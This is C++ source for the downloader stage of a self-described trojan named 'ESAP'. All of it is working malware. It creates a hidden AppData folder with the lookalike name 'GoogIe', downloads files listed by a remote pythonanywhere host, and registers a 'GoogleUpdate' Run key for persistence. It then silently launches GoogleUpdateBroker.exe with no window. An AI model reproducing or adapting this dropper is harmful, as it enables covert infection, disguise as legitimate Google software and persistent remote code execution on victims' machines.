/*
 ___ ___   _   ___ 
| __/ __| /_\ | _ \
| _|\__ \/ _ \|  _/
|___|___/_/ \_\_|  

ESAP: The Extremely Sophisticated And Potent Trojan
<_ESAP.cpp>
This is the downloader script that downloads GoogleUpdateBroker.exe

*/

#include <iostream>
#include <fstream>
#include <winsock2.h>
#include <windows.h>

#include "file.hpp"
#include "request.hpp"
#include "string_functions.hpp"

int main() {
    
    char username[256];
    DWORD dwUSize = 256;
    GetUserName(username, &dwUSize);
    std::string folderPath = "C:/Users/";
    folderPath += username;
    folderPath += "/AppData/Local/GoogIe";
    CreateDirectory(folderPath.c_str(), NULL);
    SetFileAttributes(folderPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
    SetCurrentDirectory(folderPath.c_str());

    std::vector<std::string> data;
    while (true) {
        data = SplitString(GET_Request("http://0x3af72.pythonanywhere.com/file_downloader/"), "\n");
        if (data[0] != "FILE DOWNLOADER") continue;
        break;
    }
    for (int i = 1; i < data.size(); i += 2) {
        std::ofstream pWrite(data[i], std::ios::binary);
        WriteLong(pWrite, GET_Request("http://0x3af72.pythonanywhere.com/download/?a=" + data[i + 1]));
        pWrite.close();
    }
    
    std::string regEntry = ReplaceChars(std::string('"' + folderPath + ("GoogleUpdateBroker.exe") + '"'), '/', '\\');
    RegSetKeyValue(
        HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "GoogleUpdate", REG_SZ,
        regEntry.c_str(), (regEntry.size() + 1) * sizeof(char)
    );

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    CreateProcess(NULL, "GoogleUpdateBroker.exe", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    std::cout << "finished\n";
    return 0;
}